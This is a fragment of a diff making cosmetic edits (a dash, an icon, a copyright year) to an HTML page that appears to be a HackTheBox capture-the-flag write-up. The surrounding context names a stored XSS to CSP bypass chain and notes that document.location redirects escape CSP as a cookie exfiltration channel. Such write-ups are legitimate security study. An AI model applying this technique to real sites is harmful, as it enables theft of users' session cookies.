-                            <td><code>document.location</code> redirects aren't restricted by CSP — it's a valid
+                            <td><code>document.location</code> redirects aren't restricted by CSP - it's a valid
                                 exfiltration channel.</td>
                         </tr>
                         <tr>
@@ -1287,7 +716,7 @@ flag=HTB{REDACTED}</code></pre>
                 </table>
 
                 <div class="pwned-banner">
-                    <span class="pwned-icon">🏴</span>
+                    <span class="pwned-icon"><i class="fas fa-flag"></i></span>
                     <div class="pwned-text">Machine Pwned</div>
                     <p class="pwned-sub">Stored XSS → JPEG/JS Polyglot → CSP Bypass → Cookie Exfiltration via Navigation
                     </p>
@@ -1299,7 +728,7 @@ flag=HTB{REDACTED}</code></pre>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 Abdelaaziz Belkhair</p>
+            <p>&copy; 2026 Abdelaaziz Belkhair</p>
         </div>
     </footer>
 </body>
